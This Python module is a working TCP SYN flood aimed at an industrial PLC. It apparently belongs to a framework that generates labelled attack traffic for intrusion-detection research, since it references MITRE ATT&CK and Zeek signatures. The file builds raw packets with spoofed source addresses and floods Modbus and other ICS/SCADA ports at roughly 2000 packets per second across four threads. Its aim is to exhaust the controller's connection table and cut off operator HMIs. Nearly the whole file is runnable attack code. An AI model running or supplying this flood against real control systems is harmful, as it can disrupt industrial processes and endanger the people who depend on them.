"""
Attack #3: TCP SYN Flood (Denial of Service)
==================================================================
Fills the PLC's connection table with half-open TCP connections.
Effect: the PLC can no longer accept new Modbus connections, causing HMI disconnection.

Packet rate targets:
  - Strong SYN flood: 1,000-5,000 pkt/s
  - Parallel SYN transmission across multiple threads
  - Spoofed source IP (with root privileges)

MITRE ATT&CK for ICS: T0814 - Denial of Service
Zeek signature: conn.log -> state=S0 (SYN sent, no reply), proto=tcp
"""

import time
import sys
import os
import socket
import struct
import random
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    PLC_IP, MODBUS_PORT, DEFAULT_NET_DURATION,
    LABEL_TCP_SYN_FLOOD, NET_DURATIONS
)

ATTACK_NAME = "TCP_SYN_Flood"
ATTACK_ID   = LABEL_TCP_SYN_FLOOD

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
# Target: ~2000 pkt/s (4 threads x 500 pkt/s)
THREAD_COUNT = 4
PKT_PER_SEC  = 500      # Per thread
THREAD_SLEEP = 1.0 / PKT_PER_SEC  # ~0.002s

# ICS/SCADA target ports
TARGET_PORTS = [502, 102, 4840, 1911, 20000, 44818, 2404, 9600, 1880, 80, 443, 22]


def _checksum(data: bytes) -> int:
    if len(data) % 2 != 0:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_ip_header(src_ip: str, dst_ip: str) -> bytes:
    ver_ihl  = (4 << 4) | 5
    tot_len  = 40   # IP (20) + TCP (20)
    ident    = random.randint(1, 65535)
    proto    = socket.IPPROTO_TCP
    src      = socket.inet_aton(src_ip)
    dst      = socket.inet_aton(dst_ip)
    return struct.pack('!BBHHHBBH4s4s',
        ver_ihl, 0, tot_len, ident, 0, 64, proto, 0, src, dst)


def _build_syn_packet(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    src_port = random.randint(1024, 65535)
    seq      = random.randint(0, 2**32 - 1)
    offset   = (5 << 4)
    flags    = 0x002   # SYN
    window   = random.choice([8192, 16384, 32768, 65535])  # Realistic window size

    src_b = socket.inet_aton(src_ip)
    dst_b = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src_b, dst_b, 0, socket.IPPROTO_TCP, 20)
    tcp = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, 0, offset, flags, window, 0, 0)
    chk = _checksum(pseudo + tcp)
    tcp = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, 0, offset, flags, window, chk, 0)

    ip = _build_ip_header(src_ip, dst_ip)
    return ip + tcp


def _syn_flood_worker(target_ip: str, duration_sec: float,
                      counter: list, stop_event: threading.Event,
                      thread_id: int):
    """Raw socket SYN flood worker."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        use_raw = True
    except PermissionError:
        use_raw = False
        sock = None

    start = time.time()

    while not stop_event.is_set() and (time.time() - start) < duration_sec:
        port = random.choice(TARGET_PORTS)
        try:
            if use_raw:
                # Spoofed source IP: make it look like it's coming from a different network
                src_ip = f"{random.choice([10,172,192])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                pkt = _build_syn_packet(src_ip, target_ip, port)
                sock.sendto(pkt, (target_ip, 0))
                counter[0] += 1
            else:
                # Fallback: real SYN (no spoofing, but fast)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                try:
                    s.connect((target_ip, port))
                except (BlockingIOError, OSError):
                    pass
                counter[0] += 1
                # Do not call s.close() -> leave it half-open
        except Exception:
            pass

        time.sleep(THREAD_SLEEP)

    if sock:
        try:
            sock.close()
        except Exception:
            pass


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    """Multi-threaded TCP SYN flood."""
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("tcp_syn_flood", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = PLC_IP

    est_pps = THREAD_COUNT * PKT_PER_SEC

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target   : {target_ip} (ports: {TARGET_PORTS[:4]}...)")
    print(f"  Source   : Spoofed 10.x/172.x/192.x")
    print(f"  Threads  : {THREAD_COUNT} x {PKT_PER_SEC} pkt/s = ~{est_pps} pkt/s")
    print(f"  Duration : {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"SYN flood -> {target_ip}, ~{est_pps} pkt/s, {THREAD_COUNT} threads, spoofed"
        )

    counter    = [0]
    stop_event = threading.Event()
    threads    = []

    for i in range(THREAD_COUNT):
        t = threading.Thread(
            target=_syn_flood_worker,
            args=(target_ip, duration_sec, counter, stop_event, i),
            daemon=True
        )
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while (time.time() - start_time) < duration_sec:
            elapsed = time.time() - start_time
            rem     = duration_sec - elapsed
            pps     = counter[0] / max(elapsed, 0.1)
            print(f"  [SYN]  {counter[0]:,} pkt | {pps:.0f} pkt/s | remaining: {rem:.0f}s")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n  [SYN] Manual stop!")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        pps     = counter[0] / max(elapsed, 0.1)
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{counter[0]:,} packets, {elapsed:.1f}s, {pps:.0f} pkt/s"
            )
        print(f"\n  [SYN] {counter[0]:,} packets | {pps:.0f} pkt/s | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=30)
